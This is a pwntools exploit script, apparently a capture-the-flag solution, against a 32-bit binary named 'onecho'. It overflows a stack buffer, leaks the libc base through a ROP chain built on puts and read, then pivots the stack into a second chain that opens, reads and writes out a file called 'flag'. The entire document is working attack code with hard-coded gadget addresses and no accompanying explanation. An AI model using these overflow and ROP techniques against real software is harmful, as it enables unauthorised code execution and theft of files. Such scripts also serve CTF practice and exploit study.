from pwn import *

context.log_level = 'debug'

sh = process('onecho')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')
elf = ELF('./onecho')

add_esp_0x10_leave_ret=0x080492a2
pop_esi_edi_ebp_ret=0x08049811
pop_ebx_ret=0x08049022
leave_ret=0x080492a5

#gdb.attach(sh, 'b *0x08049669')
sh.recvuntil('name:\n')
payload='a'*4+p32(1)+'b'*260+p32(0x0804c100)+p32(pop_ebx_ret)+p32(0x0804c100)
payload += p32(elf.plt['puts'])+p32(pop_ebx_ret)+p32(elf.got['puts'])+p32(elf.plt['read'])
payload += p32(add_esp_0x10_leave_ret)+p32(0)+p32(0x0804c100)+p32(0x1000)+p32(0x1000)
sh.sendline(payload)
libc_base=u32(sh.recv(4))-libc.sym['puts']
log.success("libc base: "+hex(libc_base))
pause()

payload2=p32(0)+p32(libc_base+libc.sym['open'])+p32(pop_esi_edi_ebp_ret)+p32(0x0804c140)\
        +p32(0)*2+p32(elf.plt['read'])+p32(pop_esi_edi_ebp_ret)+p32(3)+p32(0x0804c400)\
        +p32(0x100)+p32(elf.plt['write'])+p32(0)+p32(1)+p32(0x0804c400)+p32(0x100)+'flag'

sh.send(payload2)
sh.recv()
sh.interactive()
